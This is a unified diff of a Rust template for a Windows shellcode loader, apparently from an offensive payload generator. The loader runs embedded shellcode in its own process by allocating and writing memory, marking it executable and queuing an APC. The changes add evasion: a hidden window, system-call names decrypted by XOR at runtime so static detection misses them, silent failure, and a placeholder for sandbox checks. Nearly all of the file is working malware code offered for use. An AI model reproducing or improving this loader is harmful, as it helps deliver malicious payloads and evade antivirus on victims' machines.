@@ -1,65 +1,85 @@
 #![windows_subsystem = "windows"] 
 #![allow(non_snake_case)]
 
+use std::ffi::CString;
+use std::include_bytes;
+use std::ptr::null_mut;
+
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE}
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ},
+        libloaderapi::{GetModuleHandleA, GetProcAddress},
     },
     shared::{
-        ntdef::{NT_SUCCESS}
-    }
+        ntdef::{NT_SUCCESS, HANDLE},
+    },
+    ctypes::c_void,
 };
-use winapi::ctypes::c_void;
-use ntapi::ntpsapi::PPS_APC_ROUTINE;
-use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
-use std::{ptr::null_mut};
-use ntapi::ntpsapi::NtCurrentProcess;
-use ntapi::ntpsapi::NtCurrentThread; 
-use ntapi::ntmmapi::NtAllocateVirtualMemory;
-use ntapi::ntmmapi::NtWriteVirtualMemory;
-use ntapi::ntmmapi::NtProtectVirtualMemory;
-use ntapi::ntpsapi::NtQueueApcThread;
-use ntapi::ntpsapi::NtTestAlert;
-//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
 
-
-use std::include_bytes;
 {{IMPORTS}}
 
 {{SANDBOX_IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
 
+type ApcRoutine = Option<unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void)>;
+
+const K: u8 = {{API_KEY}};
+const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
+const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
+const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
+const OBF_F: &[u8] = &{{OBF_NT_QUEUE_APC_THREAD}};
+const OBF_G: &[u8] = &{{OBF_NT_TEST_ALERT}};
+
+fn r(d: &[u8]) -> Vec<u8> {
+    d.iter().map(|b| b ^ K).collect()
+}
+
+unsafe fn g(n: &[u8]) -> *const () {
+    let h = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
+    let s = r(n);
+    let c = CString::new(s).unwrap();
+    GetProcAddress(h, c.as_ptr()) as *const ()
+}
+
+type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
+type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
+type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+type FF = unsafe extern "system" fn(HANDLE, ApcRoutine, *mut c_void, *mut c_void, *mut c_void) -> i32;
+type FG = unsafe extern "system" fn() -> i32;
+
 fn enhance(mut buf: Vec<u8>) {
+    let current_process: HANDLE = -1isize as HANDLE;
+    let current_thread: HANDLE = -2isize as HANDLE;
+
     unsafe {
-        let mut allocstart : *mut c_void = null_mut();
-        let mut size : usize = buf.len();
-        let alloc_status = NtAllocateVirtualMemory(NtCurrentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if !NT_SUCCESS(alloc_status) {
-            panic!("Error allocating memory to the local process: {}", alloc_status);
-        }
+        let f_alloc: FB = std::mem::transmute(g(OBF_B));
+        let f_write: FC = std::mem::transmute(g(OBF_C));
+        let f_protect: FD = std::mem::transmute(g(OBF_D));
+        let f_queue: FF = std::mem::transmute(g(OBF_F));
+        let f_alert: FG = std::mem::transmute(g(OBF_G));
+
+        let mut base: *mut c_void = null_mut();
+        let mut size: usize = buf.len();
+        let s = f_alloc(current_process, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if !NT_SUCCESS(s) { return; }
         
-        let mut byteswritten = 0;
-        let buffer = buf.as_mut_ptr() as *mut c_void;
-        let mut buffer_length = buf.len();
-        let write_status = NtWriteVirtualMemory(NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
-        if !NT_SUCCESS(write_status) {
-            panic!("Error writing to the local process: {}", write_status);
-        }
+        let mut written = 0;
+        let ptr = buf.as_mut_ptr() as *mut c_void;
+        let len = buf.len();
+        let s = f_write(current_process, base, ptr, len, &mut written);
+        if !NT_SUCCESS(s) { return; }
 
-        let mut old_perms = PAGE_READWRITE;
-        let protect_status = NtProtectVirtualMemory(NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
-        if !NT_SUCCESS(protect_status) {
-            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
-        }
+        let mut old: u32 = PAGE_READWRITE;
+        let mut psize = len;
+        let s = f_protect(current_process, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old);
+        if !NT_SUCCESS(s) { return; }
 
-        let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute::<*mut c_void, unsafe extern "C" fn(*mut c_void, *mut c_void, *mut c_void)>(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
-        // thanks to https://github.com/trickster0/OffensiveRust/blob/c7629a285e8128348d7d7239e25db858064ad0e2/Injection_AES_Loader/src/main.rs
-        if !NT_SUCCESS(apc) {
-            panic!("Error failed to call QueueUqerAPC: {}", apc);
-        }
+        let apc_routine: ApcRoutine = Some(std::mem::transmute(base));
+        let s = f_queue(current_thread, apc_routine, base, null_mut(), null_mut());
+        if !NT_SUCCESS(s) { return; }
 
-        NtTestAlert();
+        f_alert();
     }
 }
 
@@ -67,17 +87,6 @@ fn main() {
     {{SANDBOX}}
     
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    // Removing the sandobox check for now, as it fails on numerous Windows versions.
-    /*
-    let mut memory = 0;
-    unsafe {
-        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
-        println!("{:#?}", is_quicksand);
-        if is_quicksand != 1 {
-            panic!("Hello.")
-        }
-    }
-    */
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
